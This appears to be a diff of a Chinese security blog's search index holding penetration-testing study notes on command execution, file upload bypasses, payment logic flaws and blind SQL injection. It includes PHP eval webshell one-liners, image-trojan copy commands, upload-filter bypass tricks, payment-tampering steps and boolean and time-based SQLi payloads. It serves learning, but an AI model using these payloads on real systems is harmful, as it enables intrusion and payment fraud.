     <url>/2023/08/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="序列化和反序列化的定义"><a href="#序列化和反序列化的定义" class="headerlink" title="序列化和反序列化的定义:"></a>序列化和反序列化的定义:</h1><p>序列化 (serialize)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。【将状态信息保存为字符串】</p>
@@ -1111,6 +1089,28 @@
       </categories>
       <tags>
         <tag>反序列化漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>命令执行漏洞</title>
+    <url>/2023/08/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="命令执行漏洞定义"><a href="#命令执行漏洞定义" class="headerlink" title="命令执行漏洞定义"></a>命令执行漏洞定义</h1><p>用户输入的数据被当做系统命令(cmd/bash)执行<br>whoami / net user / tasklist / xxx</p>
+<p>dir / ls / rm -rf</p>
+<h1 id="多行命令执行："><a href="#多行命令执行：" class="headerlink" title="多行命令执行："></a>多行命令执行：</h1><p>whoami&amp;net user&amp;ipconfig</p>
+<p>拿到了命令执行漏洞后还可能想要webshell</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">123</span> &gt; <span class="number">777</span>.txt</span><br><span class="line">可以尝试cmd的输出命令	<span class="keyword">echo</span> “<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])<span class="meta">?&gt;</span>” &gt;<span class="number">1</span>.php	</span><br><span class="line">netstat -ano &gt; <span class="number">1</span>.txt </span><br><span class="line">disable_function PHP的禁用函数</span><br></pre></td></tr></table></figure>
+<h1 id="命令执行函数："><a href="#命令执行函数：" class="headerlink" title="命令执行函数："></a>命令执行函数：</h1><p>system()  执行系统命令,直接输出</p>
+<p>echo exec()    执行系统命令,没有输出,输出最后一行。</p>
+<p>echo shell_exec(‘whoami’); 执行系统命令,没有输出,可以输出多行</p>
+<p>echo `whoami`             //(反引号)与shell_exec 效果完全相同【调用,即简写】</p>
+<p>passthru //只调用命令,他和system差不多</p>
+<p>popen // 比较特殊的存在 [disable_function 是可以绕的]<br>        $a = popen(‘whoami’,’r’);         //返回的是一个文件的指针地址( //r是只读、w是写入)<br>        echo fread($a,1024);</p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>命令执行漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1175,90 +1175,6 @@
       </categories>
       <tags>
         <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>支付漏洞</title>
-    <url>/2023/08/21/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="支付漏洞属于逻辑漏洞"><a href="#支付漏洞属于逻辑漏洞" class="headerlink" title="支付漏洞属于逻辑漏洞"></a>支付漏洞属于逻辑漏洞</h1><h1 id="支付过程"><a href="#支付过程" class="headerlink" title="支付过程"></a>支付过程</h1><p>用户[传参] -&gt; 商家[计算出] -&gt;第三方平台(支付宝) -&gt; 商家 -&gt;用户</p>
-<h1 id="漏洞种类"><a href="#漏洞种类" class="headerlink" title="漏洞种类"></a>漏洞种类</h1><h2 id="1-修改支付价格"><a href="#1-修改支付价格" class="headerlink" title="1.修改支付价格"></a>1.修改支付价格</h2><p>支付三步曲——订购、订单、付款<br>三个步骤当中的随便一个步骤进行修改价格测试，如果前面两步有验证机制，那么你可在最后一步付款时进行抓包尝试修改金额，如果没有在最后一步做好检验，那么漏洞就会存在，其修改的金额值你可以尝试小数目或者尝试负数。</p>
-<h2 id="2-修改支付状态"><a href="#2-修改支付状态" class="headerlink" title="2.修改支付状态"></a>2.修改支付状态</h2><p>订单完成——未完成（傻傻分不清）<br>A订单-0001完成——B订单-0002未完成<br>付款时尝试把订单B的单号给成订单A</p>
-<h2 id="3-修改订单数量"><a href="#3-修改订单数量" class="headerlink" title="3.修改订单数量"></a>3.修改订单数量</h2><p>改成0或者-1,系统自动取绝对值</p>
-<h2 id="4-修改附属值"><a href="#4-修改附属值" class="headerlink" title="4.修改附属值"></a>4.修改附属值</h2><h3 id="优惠劵"><a href="#优惠劵" class="headerlink" title="优惠劵"></a>优惠劵</h3><p>优惠劵其基本都是优惠，一般用优惠劵进行消费一般出现在第二个步骤当中：确认购买信息，在这个步骤页面当中，你可以选择相关优惠劵，然后直接修改金额大于或等于商品的价格就可以，或者直接修改其为负值进行尝试，最后进行支付，如果对这点没有加以验证，那么问题就会产生，直接支付成功</p>
-<h3 id="修改运费支付漏洞"><a href="#修改运费支付漏洞" class="headerlink" title="修改运费支付漏洞"></a>修改运费支付漏洞</h3><p><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-079085</code><br>也可以改成负数,总额=商品价格+运费,近乎白嫖</p>
-<h2 id="5-越权支付"><a href="#5-越权支付" class="headerlink" title="5.越权支付"></a>5.越权支付</h2><p>主要针对有余额的平台,属于越权漏洞,但也算是个支付漏洞吧<br>存在user=id(123),这种传参时，尝试改改id,尝试用别人的钱包买自己的包包。</p>
-<h2 id="6-跳过支付环节"><a href="#6-跳过支付环节" class="headerlink" title="6.跳过支付环节"></a>6.跳过支付环节</h2><p>抓包找到支付成功访问的页面，然后直接下个单子，复制订单号，然后拼接成功访问的页面<br><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0108184</code><br><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0188155</code></p>
-<h1 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a>防护方法</h1><h2 id="数据加密-有用-但不多"><a href="#数据加密-有用-但不多" class="headerlink" title="数据加密(有用,但不多)"></a>数据加密(有用,但不多)</h2><p>1.加密可能被解密<br>2.加密的数据也可以被复用<br>3.数据包中的加密是在前端加密的,因此会js的都能知道加密方法(因为抓包的时候就已经被加密了,请求还没发给服务器,因此一定是前端加密的)</p>
-<h2 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h2><p>商品和钱的传参应该查询数据库做校验</p>
-<h1 id="如何挖掘"><a href="#如何挖掘" class="headerlink" title="如何挖掘"></a>如何挖掘</h1><h2 id="找到关键的数据包"><a href="#找到关键的数据包" class="headerlink" title="找到关键的数据包"></a>找到关键的数据包</h2><p>​    可能一个支付操作有三四个数据包，我们要对数据包进行挑选。</p>
-<h2 id="分析数据包"><a href="#分析数据包" class="headerlink" title="分析数据包"></a>分析数据包</h2><p>​    支付数据包中会包含很多的敏感信息（账号，金额，余额，优惠），要尝试对数据包中的各个参数进行分析。</p>
-<h2 id="不按套路出牌"><a href="#不按套路出牌" class="headerlink" title="不按套路出牌"></a>不按套路出牌</h2><p>​    多去想想开发者没有想到的地方, pc端，wap端也看看，app也试试。</p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>逻辑漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传漏洞</title>
-    <url>/2023/08/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>文件上传漏洞：<br>    <strong>文件上传 是 功能</strong><br>    文件上传 =&gt; 任意文件上传漏洞（对了一半）<br>    文件上传 =&gt; 可以上传<strong>恶意</strong>文件（php\后端脚本）</p>
-<p>上传网站木马（Webshell 一句话木马）</p>
-<p>上传恶意文件，他开始和我们斗智斗勇。</p>
-<h1 id="上传方法"><a href="#上传方法" class="headerlink" title="上传方法:"></a>上传方法:</h1><h2 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测:"></a>前端检测:</h2><p><strong>计算机一般是根据文件后缀来判断文件类型的</strong>。<br>前端检测：用前端代码检测（JS）  等于 没有检测<br>    1、删除检测代码（F12不能直接删 Burp法）<br>    2、不让JS执行（立杆见影）<br>    3、上传.jpg文件，然后抓包改成PHP（标准方法）</p>
-<form method='POST' enctype="multipart/form-data">
-<input type='file' name='a' />
-<input type='submit' /></form>
-
-<p>&lt;?php var_dump($_FILES);?&gt;</p>
-<p>array(1) { [“a”]=&gt; array(5) { [“name”]=&gt; string(7) “123.php” [“type”]=&gt; string(24) “application/octet-stream” [“tmp_name”]=&gt; string(45) “C:\Users\admin\AppData\Local\Temp\php2827.tmp” [“error”]=&gt; int(0) [“size”]=&gt; int(26) } }</p>
-<p>name 上传文件名<br>type 上传文件类型标识（浏览器给的）<br>tmp_name 上传文件的临时文件（文件上传 到目标的临时目录里面，然后通过代码移动重命名到你想放的地方)<br>size 大小</p>
-<p>move_uploaded_file 移动上传文件</p>
-<p>黑名单：名单上的某某某禁止<br>白名单：只有名单上的某某某可以做 .php</p>
-<h2 id="黑名单机制"><a href="#黑名单机制" class="headerlink" title="黑名单机制:"></a>黑名单机制:</h2><p><strong>php结尾才能当作php执行 php phtml php3 php4 php5</strong></p>
-<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p> 分布式配置文件（针对不同文件夹有不同的规则 伪静态 默认不开启）</p>
-<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>不常见（主要：window服务器上有 大小写不敏感）</p>
-<h3 id="php-php空格"><a href="#php-php空格" class="headerlink" title="php / php空格"></a>php / php空格</h3><p>不同的服务器命名文件的时候会自动删除空格、点</p>
-<p>黄飞 / 黄飞鸿</p>
-<h3 id="循环检测"><a href="#循环检测" class="headerlink" title="循环检测"></a>循环检测</h3><p>：pphphp</p>
-<h3 id="文件流绕过"><a href="#文件流绕过" class="headerlink" title="文件流绕过"></a>文件流绕过</h3><p>：一个文件可以有多个文件流</p>
-<p>文件名 = 文件名::$DATA</p>
-<h2 id="白名单机制"><a href="#白名单机制" class="headerlink" title="白名单机制:"></a>白名单机制:</h2><h3 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h3><p>​    源于电报。  over 确定我自己话说完了 标识符：这个话说完了</p>
-<p>当数据传输的时候，出现00字符代表，这个数据内容的结束</p>
-<p>PHP中低版本 PHP 5.3&lt;<br>move_uploaded_file</p>
-<p>​    ../upload/1.php%00/2920220818201302.jpg<br>​<br><a href="http://zmie8016.ia.aqlab.cn/upload/2920220818201302.jpg">http://zmie8016.ia.aqlab.cn/upload/2920220818201302.jpg</a><br><a href="http://zmie8016.ia.aqlab.cn/UP5020220818201500.jpg">http://zmie8016.ia.aqlab.cn/UP5020220818201500.jpg</a></p>
-<p>图床（第三方图床 七牛云、阿里云、微博） 防止文件上传漏洞最有效的方法</p>
-<p>​    A 运行网站<br>​    B 啥都不装，装一个web容器，然后专门负责存放图片和文件</p>
-<p>根据信息安全管理条例，很多敏感信息是绝对不能放图床<br>to G 端 图传偏少 [互联网公司图床多]<br>a 61</p>
-<p>之前所有题目检测核心后缀</p>
-<p>13关开始，检测图片  </p>
-<h3 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h3><p>-图片和木马的结合<br>    <strong>要做图片马的图片，越小越好</strong><br>    而且本地测试成功再使用</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.jpg/b + <span class="number">2</span>.txt <span class="number">99</span>.jpg</span><br></pre></td></tr></table></figure>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">夹心图片马：图 + 马 + 图</span><br><span class="line">	<span class="built_in">copy</span> <span class="number">1</span>.jpg/b + <span class="number">2</span>.txt <span class="number">99</span>.jpg（末尾是&lt;?php?&gt;）</span><br><span class="line">	<span class="built_in">copy</span> <span class="number">99</span>.jpg/b + <span class="number">1</span>.jpg/b <span class="number">88</span>.jpg =&gt; 显示的都是<span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure>
-<p>​    copy的好玩法 藏文件</p>
-<p>​    二次渲染绕过 (我把你的图片重新做一下)<br>​    图片有一些基础属性是无法改变的<br>​    绕二次渲染，jpg难 png难 gif动图</p>
-<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>​        先上车 后买票<br>​        先买票 后上车</p>
-<p>​        先检测 还是 先上传</p>
-<p>​        1、检测，上传<br>​        2、上传，检测，不通过删除 （存在条件竞争）</p>
-<p>​        上传 -&gt; 检测 -&gt; 删除<br>​        1        1        1</p>
-<p>​        那么我们如果在删除前访问到文件，是不是代码就执行了</p>
-<p>​        马 生 马 =&gt; A木马运行生出B木马        </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contens</span>(<span class="string">&#x27;abc.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_REQUEST[8])?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>​        单身300年的手速，手是搓不出来，需要暴破模块</p>
-<p>​        一直上传、一直访问</p>
-<p>​        <a href="http://192.168.1.4/upload/1.php">http://192.168.1.4/upload/1.php</a></p>
-<h1 id="IIS6-0解析漏洞-gt"><a href="#IIS6-0解析漏洞-gt" class="headerlink" title="IIS6.0解析漏洞 =&gt;"></a>IIS6.0解析漏洞 =&gt;</h1><p>IIS6.0 =&gt; IIS6.0(Web容器) IIS APACHE NGINX<br>解析漏洞 =&gt; 解析（上传[把木马放到可以访问到的根目录]）<br>    =&gt; .php  .jpg(交给jpg处理)  我们可以根据漏洞，用特殊的访问手法或者特殊的后缀名会被当作后端代码执行<br>    (.htaccess)</p>
-<p>IIS6.0 =&gt; windows server 2003 的全版本都默认安装自带IIS6.0(ASP)</p>
-<p>.asp 会被当作asp文件处理<br>.jpg 会被当作jpg文件处理<br>    =&gt; 后缀调用的文件</p>
-<p>1、asa cdx cer 都会当作asp执行（微软认为不是漏洞，是特殊的默认配置<br>2、特殊符号影响：test.asp;.jpg   test.asp/123.jpg<br>3、CGI解析漏洞（PHP和Web容器的通信方法）  任何文件后面加/1.php</p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>文件上传漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1336,35 +1252,87 @@
       </tags>
   </entry>
   <entry>
-    <title>盲注</title>
-    <url>/2023/08/21/%E7%9B%B2%E6%B3%A8/</url>
-    <content><![CDATA[<h1 id="1-盲注的定义"><a href="#1-盲注的定义" class="headerlink" title="1.盲注的定义"></a>1.盲注的定义</h1><p>所谓的盲注就是在服务器没有错误回显的时候完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”</p>
-<p>没有回显的注入都可以使用盲注的做法:</p>
-<p>=&gt;联合查询没有输出点,union不能用,猜不出字段</p>
-<p>=&gt;报错注入无法使用[函数被禁,报错被关闭]</p>
-<p>注意:盲注很繁琐,适合于工具</p>
-<h1 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2.布尔盲注"></a>2.布尔盲注</h1><h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><p>页面还是有反应的,查到数据的时候页面是正常的，查不到的时候页面是错误,即布尔盲注拥有很明显的true和false但是没有报错信息.</p>
-<h2 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h2><p>select *from news where id=1 and database()=’’,如果是纯粹猜测,要猜到天荒地老.所以人们研究出来切割法,一位一位的分割出来,大大降低爆破难度</p>
-<h3 id="如何分割"><a href="#如何分割" class="headerlink" title="如何分割?"></a>如何分割?</h3><h4 id="1、判断目标有多长"><a href="#1、判断目标有多长" class="headerlink" title="1、判断目标有多长"></a>1、判断目标有多长</h4><p>length() 判断字符串长度</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">12</span> <span class="comment">-- qwe</span></span><br><span class="line">这就知道了库的长度</span><br></pre></td></tr></table></figure>
-<h4 id="2、开切"><a href="#2、开切" class="headerlink" title="2、开切"></a>2、开切</h4><p>需要一个sql函数, </p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr(切什么,从哪里开始切,切多长)</span><br><span class="line">	<span class="keyword">select</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<h4 id="3、数字可以比较：599-gt-399"><a href="#3、数字可以比较：599-gt-399" class="headerlink" title="3、数字可以比较：599&gt;399"></a>3、数字可以比较：599&gt;399</h4><h4 id="4-字符串也可以比较"><a href="#4-字符串也可以比较" class="headerlink" title="4.字符串也可以比较"></a>4.字符串也可以比较</h4><p>如果可以比较字符，那就不需要一个一个试了，直接找区间</p>
-<p>此时引入ASCII编码,sql函数为:   ascii(你想转化的字符)</p>
-<h4 id="5-找库名表名字段名"><a href="#5-找库名表名字段名" class="headerlink" title="5.找库名表名字段名"></a>5.找库名表名字段名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">32</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"></span><br><span class="line">&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1 -- qwe&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="6-得到结果的ASCII码值-进行转码即可"><a href="#6-得到结果的ASCII码值-进行转码即可" class="headerlink" title="6.得到结果的ASCII码值,进行转码即可"></a>6.得到结果的ASCII码值,进行转码即可</h4><p>可以使用char()函数,不需要找ASCII表对照</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">char</span>(<span class="number">107</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">119</span>,<span class="number">111</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">120</span>,<span class="number">105</span>,<span class="number">97</span>);</span><br></pre></td></tr></table></figure>
-<h1 id="3-时间盲注"><a href="#3-时间盲注" class="headerlink" title="3.时间盲注"></a>3.时间盲注</h1><h2 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a>适用场景</h2><p>无论做什么页面都一样,无论传参怎样,只返回一个true,页面都是正常的</p>
-<h2 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h2><p>通过传入延时函数来查看web页面返回是否延时来判断是否存在注入,同时利用if语句进行判断数据的正确与否</p>
-<h3 id="如何延时"><a href="#如何延时" class="headerlink" title="如何延时?"></a>如何延时?</h3><h4 id="1-延时函数"><a href="#1-延时函数" class="headerlink" title="1.延时函数"></a>1.延时函数</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot; and sleep(10) -- qwe</span><br></pre></td></tr></table></figure>
-<h4 id="1-if-expr1-expr2-expr3"><a href="#1-if-expr1-expr2-expr3" class="headerlink" title="1.if(expr1,expr2,expr3)"></a>1.if(expr1,expr2,expr3)</h4><p>判断语句 如果第一个语句正确就执行第二个语句;如果错误执行第三个语句,即 if(条件，成立的时候XXX，不成立的时候XXX)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(length(database())<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">120</span>,sleep(<span class="number">10</span>),<span class="number">0</span>)<span class="comment">-- qwe</span></span><br><span class="line"></span><br><span class="line"># 其余步骤和布尔盲注一样,只是根据延时与否判断是否为真</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    <title>文件上传漏洞</title>
+    <url>/2023/08/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>文件上传漏洞：<br>    <strong>文件上传 是 功能</strong><br>    文件上传 =&gt; 任意文件上传漏洞（对了一半）<br>    文件上传 =&gt; 可以上传<strong>恶意</strong>文件（php\后端脚本）</p>
+<p>上传网站木马（Webshell 一句话木马）</p>
+<p>上传恶意文件，他开始和我们斗智斗勇。</p>
+<h1 id="上传方法"><a href="#上传方法" class="headerlink" title="上传方法:"></a>上传方法:</h1><h2 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测:"></a>前端检测:</h2><p><strong>计算机一般是根据文件后缀来判断文件类型的</strong>。<br>前端检测：用前端代码检测（JS）  等于 没有检测<br>    1、删除检测代码（F12不能直接删 Burp法）<br>    2、不让JS执行（立杆见影）<br>    3、上传.jpg文件，然后抓包改成PHP（标准方法）</p>
+<form method='POST' enctype="multipart/form-data">
+<input type='file' name='a' />
+<input type='submit' /></form>
+
+<p>&lt;?php var_dump($_FILES);?&gt;</p>
+<p>array(1) { [“a”]=&gt; array(5) { [“name”]=&gt; string(7) “123.php” [“type”]=&gt; string(24) “application/octet-stream” [“tmp_name”]=&gt; string(45) “C:\Users\admin\AppData\Local\Temp\php2827.tmp” [“error”]=&gt; int(0) [“size”]=&gt; int(26) } }</p>
+<p>name 上传文件名<br>type 上传文件类型标识（浏览器给的）<br>tmp_name 上传文件的临时文件（文件上传 到目标的临时目录里面，然后通过代码移动重命名到你想放的地方)<br>size 大小</p>
+<p>move_uploaded_file 移动上传文件</p>
+<p>黑名单：名单上的某某某禁止<br>白名单：只有名单上的某某某可以做 .php</p>
+<h2 id="黑名单机制"><a href="#黑名单机制" class="headerlink" title="黑名单机制:"></a>黑名单机制:</h2><p><strong>php结尾才能当作php执行 php phtml php3 php4 php5</strong></p>
+<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p> 分布式配置文件（针对不同文件夹有不同的规则 伪静态 默认不开启）</p>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>不常见（主要：window服务器上有 大小写不敏感）</p>
+<h3 id="php-php空格"><a href="#php-php空格" class="headerlink" title="php / php空格"></a>php / php空格</h3><p>不同的服务器命名文件的时候会自动删除空格、点</p>
+<p>黄飞 / 黄飞鸿</p>
+<h3 id="循环检测"><a href="#循环检测" class="headerlink" title="循环检测"></a>循环检测</h3><p>：pphphp</p>
+<h3 id="文件流绕过"><a href="#文件流绕过" class="headerlink" title="文件流绕过"></a>文件流绕过</h3><p>：一个文件可以有多个文件流</p>
+<p>文件名 = 文件名::$DATA</p>
+<h2 id="白名单机制"><a href="#白名单机制" class="headerlink" title="白名单机制:"></a>白名单机制:</h2><h3 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h3><p>​    源于电报。  over 确定我自己话说完了 标识符：这个话说完了</p>
+<p>当数据传输的时候，出现00字符代表，这个数据内容的结束</p>
+<p>PHP中低版本 PHP 5.3&lt;<br>move_uploaded_file</p>
+<p>​    ../upload/1.php%00/2920220818201302.jpg<br>​<br><a href="http://zmie8016.ia.aqlab.cn/upload/2920220818201302.jpg">http://zmie8016.ia.aqlab.cn/upload/2920220818201302.jpg</a><br><a href="http://zmie8016.ia.aqlab.cn/UP5020220818201500.jpg">http://zmie8016.ia.aqlab.cn/UP5020220818201500.jpg</a></p>
+<p>图床（第三方图床 七牛云、阿里云、微博） 防止文件上传漏洞最有效的方法</p>
+<p>​    A 运行网站<br>​    B 啥都不装，装一个web容器，然后专门负责存放图片和文件</p>
+<p>根据信息安全管理条例，很多敏感信息是绝对不能放图床<br>to G 端 图传偏少 [互联网公司图床多]<br>a 61</p>
+<p>之前所有题目检测核心后缀</p>
+<p>13关开始，检测图片  </p>
+<h3 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h3><p>-图片和木马的结合<br>    <strong>要做图片马的图片，越小越好</strong><br>    而且本地测试成功再使用</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.jpg/b + <span class="number">2</span>.txt <span class="number">99</span>.jpg</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">夹心图片马：图 + 马 + 图</span><br><span class="line">	<span class="built_in">copy</span> <span class="number">1</span>.jpg/b + <span class="number">2</span>.txt <span class="number">99</span>.jpg（末尾是&lt;?php?&gt;）</span><br><span class="line">	<span class="built_in">copy</span> <span class="number">99</span>.jpg/b + <span class="number">1</span>.jpg/b <span class="number">88</span>.jpg =&gt; 显示的都是<span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure>
+<p>​    copy的好玩法 藏文件</p>
+<p>​    二次渲染绕过 (我把你的图片重新做一下)<br>​    图片有一些基础属性是无法改变的<br>​    绕二次渲染，jpg难 png难 gif动图</p>
+<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>​        先上车 后买票<br>​        先买票 后上车</p>
+<p>​        先检测 还是 先上传</p>
+<p>​        1、检测，上传<br>​        2、上传，检测，不通过删除 （存在条件竞争）</p>
+<p>​        上传 -&gt; 检测 -&gt; 删除<br>​        1        1        1</p>
+<p>​        那么我们如果在删除前访问到文件，是不是代码就执行了</p>
+<p>​        马 生 马 =&gt; A木马运行生出B木马        </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contens</span>(<span class="string">&#x27;abc.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_REQUEST[8])?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>​        单身300年的手速，手是搓不出来，需要暴破模块</p>
+<p>​        一直上传、一直访问</p>
+<p>​        <a href="http://192.168.1.4/upload/1.php">http://192.168.1.4/upload/1.php</a></p>
+<h1 id="IIS6-0解析漏洞-gt"><a href="#IIS6-0解析漏洞-gt" class="headerlink" title="IIS6.0解析漏洞 =&gt;"></a>IIS6.0解析漏洞 =&gt;</h1><p>IIS6.0 =&gt; IIS6.0(Web容器) IIS APACHE NGINX<br>解析漏洞 =&gt; 解析（上传[把木马放到可以访问到的根目录]）<br>    =&gt; .php  .jpg(交给jpg处理)  我们可以根据漏洞，用特殊的访问手法或者特殊的后缀名会被当作后端代码执行<br>    (.htaccess)</p>
+<p>IIS6.0 =&gt; windows server 2003 的全版本都默认安装自带IIS6.0(ASP)</p>
+<p>.asp 会被当作asp文件处理<br>.jpg 会被当作jpg文件处理<br>    =&gt; 后缀调用的文件</p>
+<p>1、asa cdx cer 都会当作asp执行（微软认为不是漏洞，是特殊的默认配置<br>2、特殊符号影响：test.asp;.jpg   test.asp/123.jpg<br>3、CGI解析漏洞（PHP和Web容器的通信方法）  任何文件后面加/1.php</p>
 ]]></content>
       <categories>
         <category>web渗透</category>
       </categories>
       <tags>
-        <tag>sql注入</tag>
+        <tag>文件上传漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>支付漏洞</title>
+    <url>/2023/08/21/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="支付漏洞属于逻辑漏洞"><a href="#支付漏洞属于逻辑漏洞" class="headerlink" title="支付漏洞属于逻辑漏洞"></a>支付漏洞属于逻辑漏洞</h1><h1 id="支付过程"><a href="#支付过程" class="headerlink" title="支付过程"></a>支付过程</h1><p>用户[传参] -&gt; 商家[计算出] -&gt;第三方平台(支付宝) -&gt; 商家 -&gt;用户</p>
+<h1 id="漏洞种类"><a href="#漏洞种类" class="headerlink" title="漏洞种类"></a>漏洞种类</h1><h2 id="1-修改支付价格"><a href="#1-修改支付价格" class="headerlink" title="1.修改支付价格"></a>1.修改支付价格</h2><p>支付三步曲——订购、订单、付款<br>三个步骤当中的随便一个步骤进行修改价格测试，如果前面两步有验证机制，那么你可在最后一步付款时进行抓包尝试修改金额，如果没有在最后一步做好检验，那么漏洞就会存在，其修改的金额值你可以尝试小数目或者尝试负数。</p>
+<h2 id="2-修改支付状态"><a href="#2-修改支付状态" class="headerlink" title="2.修改支付状态"></a>2.修改支付状态</h2><p>订单完成——未完成（傻傻分不清）<br>A订单-0001完成——B订单-0002未完成<br>付款时尝试把订单B的单号给成订单A</p>
+<h2 id="3-修改订单数量"><a href="#3-修改订单数量" class="headerlink" title="3.修改订单数量"></a>3.修改订单数量</h2><p>改成0或者-1,系统自动取绝对值</p>
+<h2 id="4-修改附属值"><a href="#4-修改附属值" class="headerlink" title="4.修改附属值"></a>4.修改附属值</h2><h3 id="优惠劵"><a href="#优惠劵" class="headerlink" title="优惠劵"></a>优惠劵</h3><p>优惠劵其基本都是优惠，一般用优惠劵进行消费一般出现在第二个步骤当中：确认购买信息，在这个步骤页面当中，你可以选择相关优惠劵，然后直接修改金额大于或等于商品的价格就可以，或者直接修改其为负值进行尝试，最后进行支付，如果对这点没有加以验证，那么问题就会产生，直接支付成功</p>
